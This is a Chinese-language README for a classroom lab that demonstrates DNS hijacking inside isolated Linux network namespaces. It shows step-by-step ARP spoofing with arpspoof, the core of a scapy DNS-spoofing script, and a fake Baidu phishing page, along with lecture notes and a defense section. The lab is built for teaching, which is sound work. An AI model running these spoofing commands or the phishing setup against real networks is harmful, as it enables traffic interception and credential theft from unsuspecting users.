# DNS 劫持演示靶场（www.baidu.com → 钓鱼站）

用于**网络安全课程演示**的完全隔离实验环境。默认演示场景：

> 受害者想访问 **www.baidu.com**，DNS 被劫持后，实际落到**攻击者的
> 仿百度钓鱼页**（页脚带 TANEI·计算机社团 / www.tanei.top 标识）。

全部流量封在 Linux network namespace 里，不碰真实网络、不污染真实 DNS。
所有命令都在本机实测通过。

---

## 目录内容

**Linux 版（首选 —— 用 netns 完全隔离，零副作用）**

- `lab.sh` —— 靶场主控脚本（搭建 / 攻击 / 恢复 / 清理）
- `dns-spoof.py` —— DNS 抢答器（scapy 实现，会打印每一次抢答）
- `fake-baidu.py` —— 仿百度钓鱼页（跑在攻击者 ns-att 上）
- `webserver.py` —— 通用极简 Web 服务（保留备用）

**Windows 版（没有 netns 可用，只能在「本地安全」与「局域网需授权」之间取舍）**

- `dns-hijack-win.py` —— Windows 下的 DNS 劫持脚本（`local` / `lan` 两种模式）
- `WINDOWS-使用说明.md` —— Windows 版用法、验证边界与安全注意事项

## 环境要求

- Linux + root 权限（要创建 network namespace 和网桥）
- 依赖：`iproute2`、`dnsmasq`、`dsniff`（提供 arpspoof）、`openssl`、
  `dnsutils`（提供 dig）、`curl`、`python3-scapy`

解压后先自检：

```bash
sudo ./lab.sh deps
```

缺依赖就一行装齐（Debian / Kali / Ubuntu）：

```bash
sudo apt update && sudo apt install -y dnsmasq dsniff openssl curl dnsutils python3-scapy
```

Kali 自带得比较全，通常不用装。

---

## 拓扑

```
   ns-gw (10.66.0.1)      ns-att (10.66.0.10)     ns-vic (10.66.0.20)
   「真实互联网」            「攻击者」               「受害者」
   真实 DNS                仿百度钓鱼页 + 抢答器
   （把 www.baidu.com
     解析到真实百度 IP）
        │                        │                        │
     veth-gw                 veth-att                 veth-vic
        └────────────┬───────────┴────────────────────────┘
                br-dnslab（宿主机上的纯二层网桥，不配 IP）
```

- `ns-gw` 上的 dnsmasq 把 `www.baidu.com` 解析到**真实百度 IP**
  （`183.2.172.177`，`REAL_IP` 变量，演示前可用 `dig` 现查更新）
- `ns-att` 上的抢答器把 `www.baidu.com` 解析到**自己**（`10.66.0.10`）

---

## 五分钟跑通

```bash
cd ~/dns-lab

sudo ./lab.sh up        # 搭建靶场
sudo ./lab.sh check     # ① 劫持前：解析到真实百度 IP
sudo ./lab.sh attack    # ② 发起攻击（ARP 欺骗 + DNS 抢答）
sudo ./lab.sh dig       # ③ 再看解析 → 攻击者 IP
sudo ./lab.sh curl      # ④ 访问 → 仿百度钓鱼页
sudo ./lab.sh attack-stop   # ⑤ 停止攻击并恢复
sudo ./lab.sh down      # ⑥ 全部清理
```

---

## 桌面演示：用浏览器看劫持效果（课堂效果最好）

命令行的 `curl` 对比已经能说明问题，但**浏览器里亲眼看到**冲击力大得多。

### 准备

```bash
sudo ./lab.sh up
sudo ./lab.sh nat-on      # 让受害者节点能上真实互联网
sudo ./lab.sh browser     # 在受害者节点里开 Firefox，窗口出现在桌面上
```

`nat-on` 会临时改三处宿主机设置（都在 `nat-off` 里还原）：

- 给网桥 `br-dnslab` 加网关地址 `10.66.0.254`
- `net.ipv4.ip_forward = 1`
- 一条只对 `10.66.0.0/24` 源地址生效的 `MASQUERADE` 规则

宿主机自身的上网、已有连接不受影响（已在实验中验证）。

### 演示

1. 浏览器打开后，地址栏输入 `www.baidu.com` → 看到**真实百度**
2. 另开一个终端：`sudo ./lab.sh attack`
3. 回到浏览器，地址栏**重新输入 `http://www.baidu.com`**（注意带上 `http://`）
4. 页面变成**仿百度钓鱼页**（顶部红色劫持警示，页脚 TANEI 社团）

同时可以在终端里展示攻击者视角：

```bash
sudo ./lab.sh logs
#   [22:39:08] 10.66.0.20 HTTP /（Host: www.baidu.com）
```

—— 受害者的浏览器以为自己还在百度，请求却落在了攻击者服务器上。

### 两个容易踩的坑

**坑 1：地址栏输入 `https://` 会看到证书警告。**

假站用的是自签证书，浏览器访问 `https://www.baidu.com` 会弹
「您的连接不是私密连接」。这**恰恰是真实钓鱼的关键一环** —— 攻击者就是
赌用户会点「高级 → 接受风险并继续」。课堂上正好用它讲：

> 看到没有？浏览器其实报警了。但现实中很多人会直接点「继续」。
> 这也说明为什么 HTTPS 普及之后，纯 DNS 劫持的杀伤力下降了，
> 但「钓鱼」这件事依然有效。

要流畅看到钓鱼页，就用 `http://www.baidu.com`。

**坑 2：DNS 缓存 / 连接复用会让浏览器继续连旧 IP。**

`lab.sh browser` 已经在 profile 里关掉了 DNS 缓存和 HTTPS 优先。若演示中
浏览器仍连着旧地址，重新执行 `sudo ./lab.sh browser` 重启浏览器即可。

### 收尾

```bash
sudo ./lab.sh browser-kill
sudo ./lab.sh nat-off      # 恢复宿主机网络设置
sudo ./lab.sh down
```

### 不想改宿主机设置？

那就跳过 `nat-on`，`up` + `attack` 后用命令行 `dig` / `curl` 演示。
效果差一点，但零副作用。

## 课堂上怎么讲（逐步 + 讲解词）

### 第 0 步 —— 建立基线

```bash
sudo ./lab.sh check
```

预期输出（要点）：

```
受害者解析 www.baidu.com：
    www.baidu.com.  0  IN  A  183.2.172.177
  解析结果 183.2.172.177 → 真实百度 IP（正常）
```

**讲解词**：现在一切正常。受害者的 DNS 服务器是 `10.66.0.1`（我们的
`ns-gw`），它把 `www.baidu.com` 解析成真实百度的 IP。这是「正常状态」。
（隔离环境里连不出真实百度，属预期 —— 这一步只看解析结果。）

### 第 1 步 —— ARP 欺骗：把流量引过来

```bash
sudo ./lab.sh attack
```

看 `attack` 输出里的这一行，是全场最有说服力的一幕：

```
ARP 欺骗已生效：受害者现在认为 10.66.0.1 位于 d6:4e:42:32:85:78
```

再对比 MAC：

```bash
sudo ./lab.sh status
```

**讲解词**：DNS 劫持不是凭空发生的，攻击者必须先让受害者的 DNS 查询
经过自己。`arpspoof` 反复给受害者发 ARP 应答，声称「`10.66.0.1` 的 MAC
是我」。ARP 协议没有认证，谁答得快就信谁 —— 于是受害者把发往 DNS
服务器的包，实际交到了攻击者手上。

### 第 2 步 —— DNS 抢答：伪造答案

```bash
sudo ./lab.sh dig
```

现在解析结果是 `10.66.0.10`（攻击者 IP）。

**讲解词**：DNS 走 UDP，客户端只认第一个到达的有效响应。攻击者现在
在中间，看到查询就立刻回一个伪造应答（把 `www.baidu.com` 指向自己），
比真服务器更快。看抢答器日志能看到每一次抢答：

```bash
sudo ./lab.sh logs
#   [抢答] www.baidu.com → 10.66.0.10   (冒充 10.66.0.1)
```

### 第 3 步 —— 受害者上钩

```bash
sudo ./lab.sh curl
```

输出：

```
页面标题：百度一下，你就知道
→ 落到了攻击者的钓鱼站（TANEI 演示页）
```

受害者输入的是 `www.baidu.com`，看到的页面标题也是「百度一下，你就
知道」—— 但它其实是攻击者服务器上的**仿冒页**，页面上有醒目的
劫持警示和 TANEI 社团页脚。

攻击者日志里能直接看到「是谁、用哪个域名访问的」：

```bash
sudo ./lab.sh logs
#   [22:20:12] 10.66.0.20 请求 /（Host 头：www.baidu.com）
```

**关键点**：Host 头是 `www.baidu.com` —— 受害者的浏览器以为自己还在
访问百度，实际请求已经落到了攻击者服务器。真实攻击里，下一步就是把
这个仿冒页换成账号密码登录框。

### 第 4 步 —— 收尾

```bash
sudo ./lab.sh attack-stop   # 停攻击 + 修复受害者 ARP 表
sudo ./lab.sh dig           # 恢复：183.2.172.177
```

---

## 原理拆解

### 为什么 DNS 用 UDP，就成了弱点

DNS 查询默认走 UDP（为了快）。UDP 无连接、无握手，客户端**只认第一个
到达的有效响应**，不验证「这个响应是不是我问的那台服务器发的」。TCP
要先三次握手，中途插话容易被发现；UDP 没这步。

攻击者只要做到两件事：

1. **让查询经过自己** —— 本靶场用 ARP 欺骗实现
2. **比真服务器先答** —— 就是「抢答」

### 抢答器做了什么

看 `dns-spoof.py` 的核心，其实只有几行：

```python
spoofed = (
    Ether(src=my_mac, dst=pkt[Ether].src) /   # 二层：直接发回受害者
    IP(src=pkt[IP].dst, dst=pkt[IP].src) /    # 三层：冒充被查询的 DNS 服务器
    UDP(sport=53, dport=pkt[UDP].sport) /
    DNS(id=pkt[DNS].id, qr=1, aa=1,          # 事务 ID 与查询一致
        qd=pkt[DNS].qd,
        an=DNSRR(rrname=pkt[DNSQR].qname, type="A", ttl=60, rdata=fake_ip))
)
```

三个关键点：

- **`src=pkt[IP].dst`**：响应源地址写成真实 DNS 服务器的地址，受害者
  一看「哦，是我问的那台服务器答的」
- **`id=pkt[DNS].id`**：DNS 事务 ID 必须和查询一致，否则客户端丢弃。
  老式盲猜攻击要猜这个 16 位 ID，而**抢答不用猜** —— 我们在中间
  能看到查询原文
- **`dst=pkt[Ether].src`**：直接把伪造响应发回受害者，抢在真服务器前

### 一个诚实的说明

早期版本用 `dnsspoof`（dsniff 经典工具），实测它在 **netns + veth**
环境下静默无响应（能收到查询但不回包、不报错），所以换成自研的
scapy 实现。这本身也是教学点：**工具不是万能的，理解原理才能自己造、
才能排查为什么不好使**。`dnsspoof` 在真实物理网络里通常仍可用。

---

## 方案 B：让受害者真实连到 www.tanei.top（可选，需额外步骤）

方案 A 是纯本地假站。如果你想让受害者**真的连到你们 `www.tanei.top`
的服务器**（`47.243.153.128`），需要额外两步，且会打破隔离：

### B-1：服务器要认 `Host: www.baidu.com`

实测：你们的 openresty 目前对 `Host: www.baidu.com` 返回 **404**：

```bash
curl -s -H 'Host: www.baidu.com' http://47.243.153.128/ -o /dev/null -w '%{http_code}\n'
# 404
```

因为虚拟主机只配置了 `www.tanei.top` 这个 server_name。要让演示不穿帮，
需要在服务器上加一个接受 `www.baidu.com` 的 server 块（或 default_server），
指向你们想展示的页面。

### B-2：打通受害者出网路径（打破隔离）

当前拓扑宿主机在网桥上不配 IP。要让 `ns-vic` 访问公网，需要：

```bash
# 给网桥配一个网关地址（10.66.0.254）
ip addr add 10.66.0.254/24 dev br-dnslab
# 受害者默认路由指向它
ip netns exec ns-vic ip route add default via 10.66.0.254
# 宿主机开启转发 + 对靶场网段做 NAT
sysctl -w net.ipv4.ip_forward=1
iptables -t nat -A POSTROUTING -s 10.66.0.0/24 -o eth0 -j MASQUERADE
```

然后把抢答目标从攻击者自己改成 tanei.top 真实 IP：

```bash
# 改 run/dns-spoof.hosts 后重新 attack，或临时用这条：
echo '47.243.153.128 www.baidu.com' > /home/sinan/dns-lab/run/dns-spoof.hosts
```

**注意**：以上步骤修改了宿主机 `ip_forward` 和 `iptables`，会真实访问
你们的服务器，且依赖现场公网连通性。演示完务必恢复：

```bash
iptables -t nat -D POSTROUTING -s 10.66.0.0/24 -o eth0 -j MASQUERADE
sysctl -w net.ipv4.ip_forward=0
ip addr del 10.66.0.254/24 dev br-dnslab
```

**结论**：课堂演示默认用方案 A 即可 —— 效果一样、零真实流量、不依赖
现场网络、不会因为服务器 404 而穿帮。方案 B 适合想讲「钓鱼站被架在
攻击者自己的公网服务器上」这一层时使用。

---

## 手动版（不依赖脚本，逐条讲解）

想让学生看清每一步，可以手工敲（root 下执行）：

```bash
# ── 1. 隔离网桥（宿主机不给 IP，纯二层）
ip link add br-dnslab type bridge
ip link set br-dnslab up

# ── 2. 三个节点（以 ns-gw 为例，另两个同理）
ip netns add ns-gw
ip link add veth-gw type veth peer name veth-gw-br
ip link set veth-gw netns ns-gw
ip link set veth-gw-br master br-dnslab
ip link set veth-gw-br up
ip netns exec ns-gw ip link set lo up
ip netns exec ns-gw ip link set veth-gw up
ip netns exec ns-gw ip addr add 10.66.0.1/24 dev veth-gw

# ── 3. 受害者的 DNS 配置（只在该 netns 内可见，改不到宿主机）
mkdir -p /etc/netns/ns-vic
echo "nameserver 10.66.0.1" > /etc/netns/ns-vic/resolv.conf

# ── 4. 真实 DNS：把 www.baidu.com 解析到真实百度 IP
ip netns exec ns-gw dnsmasq --keep-in-foreground --conf-file=/dev/null \
  --user=root --bind-interfaces --listen-address=10.66.0.1 --port=53 \
  --no-resolv --no-hosts --address=/www.baidu.com/183.2.172.177 --log-queries

# ── 5. 攻击：ARP 欺骗 + DNS 抢答
ip netns exec ns-att arpspoof -i veth-att -t 10.66.0.20 10.66.0.1
ip netns exec ns-att python3 dns-spoof.py -i veth-att -f rules.txt
# rules.txt 内容：  10.66.0.10 www.baidu.com

# ── 6. 验证
ip netns exec ns-vic dig www.baidu.com       # → 攻击者 IP
ip netns exec ns-vic curl http://www.baidu.com/   # → 钓鱼页
```

清理：`ip netns del <名字>`、`ip link del br-dnslab`、`rm -rf /etc/netns/ns-vic`。

---

## 更简单的变体：本地解析配置劫持

课时紧张时，有个 5 分钟版，不需要流量欺骗，适合先讲「域名怎么变成 IP」：

```bash
# 变体 A：改 hosts 文件，优先级高于任何 DNS
echo "10.66.0.10 www.example.lab" | sudo tee -a /etc/hosts
getent hosts www.example.lab     # → 10.66.0.10
sudo sed -i '/www.example.lab/d' /etc/hosts   # 演示完删掉

# 变体 B：把 DNS 服务器指向攻击者（会改真实 DNS，务必改回）
sudo sh -c 'echo "nameserver 10.66.0.10" > /etc/resolv.conf'
```

---

## 防御视角（课程讨论点）

按攻击链条逐环拆：

**断第 1 环（ARP 欺骗）**

- 交换机 **Dynamic ARP Inspection (DAI)** + DHCP Snooping
- 静态 ARP 绑定（小网络可行）
- 终端检测：`arpwatch`、ARP 表异常告警

**断第 2 环（DNS 抢答）**

- **DNSSEC**：给 DNS 响应做数字签名，伪造响应没有合法签名，客户端丢弃
- **DoH / DoT**：加密 DNS 查询，攻击者看不到内容就无法针对性伪造
- 随机化源端口 + 事务 ID：抬高盲猜难度（对「抢答」效果有限，因为
  中间人本来就能看到查询）

**兜底**

- **HTTPS 普及**：即使 DNS 被劫持，证书校验也会失败。DNS 劫持在
  HTTPS 时代最大危害是「引导到钓鱼站」而非「静默窃听」
- 浏览器 HSTS、证书透明度（CT）

现场可以演示：把假站换成 HTTPS，连接会直接失败 —— 说明为什么
HTTPS 让纯 DNS 劫持杀伤力下降，但钓鱼依然有效。

---

## 常见问题与实操提示

**解压后找不到 `lab.sh`？**  
目录应是一层 `dns-lab/lab.sh`。若变成 `dns-lab/dns-lab/lab.sh`，是套娃解压——进入内层或重新解压到空目录。

**`REAL_IP` 要更新吗？**  
百度有 CDN，不同地区/时间解析结果会变。演示前跑一下
`dig +short www.baidu.com`，把 **A 记录**更新到 `lab.sh` 顶部的 `REAL_IP`。

**`attack` 后 dig 还返回真实 IP？**  
ARP 欺骗还没生效。脚本内置等待和检测，会打印「ARP 欺骗已生效」。
一直不生效就先 `attack-stop` 再重新 `attack`。

**`nat-on` 之后忘了收尾？**  
务必 `browser-kill` → `nat-off` → `down`。否则宿主机可能残留转发与网桥地址。

**会不会影响真实网络？**  
默认不会。靶场在独立 netns；未开 `nat-on` 时网桥不配对外路由。`down` 之后应全部回收。自查：`ip netns list; ip -br link show type bridge; ip -br addr`。

**浏览器仍打开真百度？**  
地址栏请用 `http://www.baidu.com`（不要依赖 HTTPS）；再执行一次 `sudo ./lab.sh browser` 清掉缓存连接。

**能用别的域名演示吗？**  
能。改 `lab.sh` 顶部的 `DOMAIN` / `HOST` / `REAL_IP` 三个变量，把
`fake-baidu.py` 换成对应仿站即可。

**源码放在 sshfs / Windows 共享盘上 QEMU 或网卡异常？**  
把工作副本放到 Linux 本地磁盘再跑（网络盘对部分底层打开方式不友好）。

---

## 清理

```bash
sudo ./lab.sh down
```

停服务、删 netns（连带 veth）、删网桥、移除 `/etc/netns/ns-vic`。
演示结束以「无残留 netns / 无 br-dnslab」为准。
